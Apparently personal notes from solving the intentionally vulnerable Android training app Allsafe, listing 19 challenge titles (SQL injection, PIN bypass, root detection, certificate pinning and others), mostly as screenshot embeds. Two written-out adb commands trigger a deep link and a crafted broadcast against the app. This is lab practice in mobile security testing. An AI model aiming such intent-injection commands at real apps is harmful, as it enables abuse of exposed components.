----
## Chall 1 - Insecure logging
![[1-CHALL-1.png]]

-----
## Chall 2 - Hardcoded Credentials
![[2-CHALL-1.png]]

![[2-CHALL-2.png]]

------
## Chall 3 - Firebase database

![[3-CHALL.png]]

----
## Chall 4 - Insecure Shared  Preferences

![[4-CHALL.png]]

----
## Chall 5 - SQL injection

![[5-chall-1.png]]
![[5-chall-2.png]]
![[5-chall-3.png]]
![[5-chall-4.png]]

----
## Chall 6 - PIN bypass

![[6-chall.png]]
![[6-chall-2.png]]
![[6-chall-3.png]]
![[6-chall-4.png]]
![[6-chall-5.png]]

----
## Chall 7 - Root Detection![[7-chall-root detection-1.png]]
![[7-chall-root detection-2.png]]
![[7-chall-root detection-3.png]]
![[7-chall-root detection-4.png]]

----
## Chall 8 - Secure Flag Bypassash![[8-chall-bypasssecure.png]]
![[8-chall-bypasssecure-2.png]]

----
## Chall 9 - Deep Link Bypass
```bash
adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

![[Pasted image 20230519174422.png]]
![[Pasted image 20230519174612.png]]
![[Pasted image 20230519174645.png]]

----
## Chall 10 - Insecure Broadcast Receiver

```
adb shell am broadcast -a "infosecadventures.allsafe.action.PROCESS_NOTE" --es server
 '192.168.1.10' --es note 'Hello,World' --es notification_message 'Compromised'
  -n infosecadventures.allsafe/.challenges.NoteReceiver
```
![[10-Chall.png]]
----
## Chall 11 - Vulnerable WebView

![[Pasted image 20230519233401.png]]

![[Pasted image 20230519233347.png]]
![[11-chall.png]]

----
## Chall 12 - Certificate Pinning
![[12-chall-1.png]]
![[12-chall-2.png]]

----
## Chall 13 - Weak Cryptography

![[13-chall-1.png]]
![[13-chall-2.png]]
----
## Chall 14 - Insecure Service
![[14-chall-2.png]]

![[14-chall-1.png]]
----
## Chall 15 - Object Serialization
![[15-chall-2.png]]
![[15-chall-1.png]]
----
## Chall 16 - Insecure Providers
![[Pasted image 20230522095236.png]]
![[Pasted image 20230522095334.png]]
----
## Chall 17 - Arbitrary Code Execution
 IRei apontar a falha mas sem codar o app. Apenas mostrar o porque o código está vulnerável.
----
## Chall 18 - Native Library
![[18-chall-1.png]]
![[18-chall-2.png]]
----
## Chall 19 - Smali Patch

![[19-chall-1.png]]

----